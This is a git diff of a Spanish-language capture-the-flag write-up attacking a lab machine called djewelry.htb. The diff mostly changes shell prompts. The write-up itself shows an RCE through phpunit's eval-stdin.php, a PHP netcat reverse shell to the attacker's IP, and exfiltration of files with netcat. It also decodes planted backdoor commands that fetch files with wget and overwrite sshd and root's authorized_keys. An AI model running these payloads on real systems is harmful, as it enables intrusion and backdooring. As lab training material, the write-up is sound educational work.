@@ -66,7 +66,7 @@ PORT   STATE SERVICE VERSION
 
 Vemos el titulo de la web _Diana's Jewelry_ y la versión del servidor apache _2.4.41_, también nos dice que está corriendo el servicio en un sitema operativo Ubuntu, esto último lo podremos corroborar cuando estemos dentro del sistema (por si no hay un falso positivo), de resto no hay mucho más; por lo que, procedemos a enumerar la web ya que de momento no contamos con ninguna credencial para acceder por _ssh_. Ejecutamos la herramienta __whatweb__ en la terminal:
 ```shell
-❯ whatweb http://10.10.11.146
+rabb1t@hold:~$ whatweb http://10.10.11.146
 http://10.10.11.146 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.146], JQuery[2.1.4], Script, Title[Diana\'s Jewelry]
 ```
 
@@ -84,7 +84,7 @@ Otra vez, ninguno de los botones nos llevan a ningún lado interesante, incluso 
 Procedemos a _fuzzear_ directorios lanzando el script `http-enum` de `nmap` que tiene un diccionario con alrededor de `1000` rutas comunes de sitios web. En la primera web no vemos nada interesante de lo que nos podamos aprovechar (el dominio es `djewelry.htb`). Hacemos lo mismo para la segunda web con el subdomino `store` y nos encontramos los siguientes directorios:
 
 ```shell
-❯ nmap -p80 --script http-enum store.djewelry.htb
+rabb1t@hold:~$ nmap -p80 --script http-enum store.djewelry.htb
 Nmap scan report for store.djewelry.htb (10.10.11.146)
 PORT   STATE SERVICE
 80/tcp open  http
@@ -105,18 +105,18 @@ Si hacemos un poco de investigación sobre lo que podemos hacer con lo que tenem
 
 Por lo que ejecutando lo siguiente en la terminal:
 ```shell
-❯ curl -sX GET http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('ifconfig')?>"
+rabb1t@hold:~$ curl -sX GET http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('ifconfig')?>"
 ```
 
 Nos damos cuenta de que tenemos RCE (ejecución remota de comados en la máquina victima).
 Vamos a entablarnos una revershell a nuestra interfaz `tun0` por el puerto `443` con `netcat`:
 ```shell
-❯ curl -sX GET http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.10.16.2 443 >/tmp/f')?>"
+rabb1t@hold:~$ curl -sX GET http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.10.16.2 443 >/tmp/f')?>"
 ```
 
 ...y poniéndonos en escucha con `netcat` en otra ventana:
 ```shell
-❯ nc -nvlp 443
+rabb1t@hold:~$ nc -nvlp 443
 ```
 
 Ganamos acceso como el usuario `www-data`
@@ -127,17 +127,17 @@ Haciendo reconocimiento básico sobre el sistema con este usuario, no encontramo
 
 Pasamos el archivo (una copia) a nuestra máquina para trabajar más comodo, escribimos lo siguiente en la máquina victima:
 ```shell
-❯ nc -Nv 10.10.16.9 4343 < info
+rabb1t@hold:~$ nc -Nv 10.10.16.9 4343 < info
 ```
 
 ...y en nuestra máquina escribimos:
 ```shell
-❯ nc -nvlp 4343 > info
+rabb1t@hold:~$ nc -nvlp 4343 > info
 ```
 
 Ejecutamos el comando `strings` sobre el binario:
 ```shell
-❯ strings info
+rabb1t@hold:~$ strings info
 ```
 
 ...encontramos el siguiente texto dentro de todas las cadenas imprimibles:
@@ -145,7 +145,7 @@ Ejecutamos el comando `strings` sobre el binario:
 
 Parece hexadecimal. Lo copiamos y lo metemos en un archivo para guardar la evidencia. Ahora podemos tratarlo con el siguiente comando:
 ```shell
-❯ cat info_hex | xxd -p -r
+rabb1t@hold:~$ cat info_hex | xxd -p -r
 ```
 
 Lo que nos muestra lo siguiente:
@@ -155,7 +155,7 @@ wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles
 
 Podemos observar lo que parece un hash de una contraseña, lo guardamos en un archivo. Yo le pondré `hash`. Ahora podemos crackearlo con [John the Ripper](https://www.openwall.com/john/):
 ```shell
-❯ john -w /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
+rabb1t@hold:~$ john -w /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
@@ -166,7 +166,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-Obtenemos en texto claro su equivalencia (linea 7: `ìhatehackers`) ¿De qué usuario? En el `/etc/passwd` podimos ver que hay dos usuarios con una shell, los cuales son "steven y steven1" (además de "root" y "www-data"). Probamos la contraseña para ambos usuarios y vemos que podemos acceder al usuario `steven1`.
+Obtenemos en texto claro su equivalencia (linea 7: `ìhatehackers`) ¿De qué usuario? En el `/etc/passwd` pudimos ver que hay dos usuarios con una shell, los cuales son "steven y steven1" (además de "root" y "www-data"). Probamos la contraseña para ambos usuarios y vemos que podemos acceder al usuario `steven1`.
 ```shell
 ❯ su steven1
 Password: ihatehackers
@@ -214,17 +214,17 @@ Vemos que un archivo ha sido manipulado recientemente:
 
 Nos traemos el archivo a nuestra máquina para revisarlo como hicimos con el último:
 ```shell
-❯ strings mod_reader.so
+rabb1t@hold:~$ strings mod_reader.so
 ```
 
 Hay una cadena en base 64. Procedemos a decodificarla y la guardamos en un archivo como evidencia:
 ```shell
-echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk" | base64 -d > mod_reader_hex.txt
+rabb1t@hold:~$ echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk" | base64 -d > mod_reader_hex.txt
 ```
 
 Vemos lo siguiente:
 ```shell
-❯ cat mod_reader_hex.txt
+rabb1t@hold:~$ cat mod_reader_hex.txt
 wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
 ```
 Esto es un poco raro ya que hay un archivo de apache (`mod_reader.so`) que está haciendo algo con el demonio de ssh, están pasando cosas por aquí.
@@ -233,7 +233,7 @@ Puede que el demonio de ssh haya sido manipulado, por lo que vamos a traer el bi
 
 Haciendo un `strings` al binario filtrando por la palabra "backdoor", vemos lo siguiente:
 ```shell
-❯ strings sshd | grep "backdoor" | sort -u
+rabb1t@hold:~$ strings sshd | grep "backdoor" | sort -u
 backdoor
 backdoor_active
 backdoor.h
@@ -344,7 +344,7 @@ Ahora vamos a jugar con CyberChef:
 
 Por último nos intentamos conectar como root a la máquina victima con la contraseña obtenida:
 ```shell
-❯ sshpass -p '@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3' ssh root@10.10.11.146
+rabb1t@hold:~$ sshpass -p '@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3' ssh root@10.10.11.146
 ```
 
 Y efecticamente, esa era la comparación que se estaba haciendo en el demonio de ssh modificado.
